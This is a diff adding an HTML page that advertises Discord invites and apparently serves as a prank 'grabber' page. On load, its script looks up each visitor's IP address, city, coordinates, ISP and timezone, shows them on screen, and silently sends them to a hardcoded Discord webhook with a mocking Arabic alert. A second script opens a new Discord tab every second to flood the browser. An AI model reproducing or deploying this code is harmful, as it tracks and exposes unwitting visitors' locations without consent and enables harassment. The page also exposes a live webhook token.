@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>discord.gg/uaee</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Courier New', Courier, monospace;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+        .image-container img {
+            width: 750px; 
+            height: auto;
+            border: 2px solid #ffffff; 
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.7); 
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #ffffff; 
+            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffffff, 0px 0px 25px #ffffff; 
+            letter-spacing: 4.5px; 
+            white-space: pre-wrap;
+        }
+        .text {
+            margin-top: 20px;
+            font-size: 3em; 
+            color: #ffffff; 
+            text-shadow: 0px 0px 8px #ffffff, 0px 0px 15px #ffffff, 0px 0px 25px #ffffff; 
+            letter-spacing: 4.5px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <img src="https://cdn.discordapp.com/attachments/1252399493916393593/1366444066853748906/image.png?ex=6810f7b4&is=680fa634&hm=38c0bbedb4a24b02b032fdd0d24b8ede0c96860c755c7b3d77b224bd3c11ee44&" alt="Discord Image">
+    </div>
+    <audio autoplay loop>
+        <source src="2.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+<div class="info" id="ip-info">
+    </div>
+
+    <!-- هنا النص اللي غيرناه -->
+    <div class="text">discord.gg/kyd</div>
+
+    <script>
+        // سحب بيانات الـ IP
+        fetch('https://ipinfo.io/json')
+        .then(response => response.json())
+        .then(data => {
+            const { ip, country, city, region, loc, org, timezone } = data;
+
+            // تحديد البورت بناءً على البروتوكول
+            const port = window.location.port || (location.protocol === 'https:' ? '' : '');
+
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.innerHTML = `KAYD on top <strong>IP:</strong><span>"${ip}"</span><br><strong>KAYD on top:</strong><span style="color: #ffd700">${port}</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong>ISP:</strong><span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
+
+            const dateTime = new Date().toLocaleString();
+            const webhookUrl = 'https://discord.com/api/webhooks/1364674734603636796/MqoG7Frn3mXs3Zt5DR_tBOpCNbPBhM0VtdfaqAFWfzYj3KBV3VM8Dl6SQn9U6UNTDPn0';
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `⚠️ **هطف جديد اشتغلت عنده الشاشه ** ⚠️\n\n` +
+ `**IP:** \`${ip}\`\n` +`**port:** \`${port}\`\n` +`**Location:** ${country} - ${city}\n` +`**Coordinates:** ${loc}\n` +`**ISP:** ${org}\n` + `**Time:** ${dateTime}`
+                })
+            });
+        });
+</script>
+<!-- فتح نوافذ Discord تلقائيًا -->
+<script>
+
+        // فتح رابط الديسكورد الرسمي كل ثانية بدون تدخل
+        setInterval(() => {
+            window.open('https://discord.gg/kyd', '_blank');
+        }, 1000); // كل ثانية
+    </script>
+</body>
+</html>
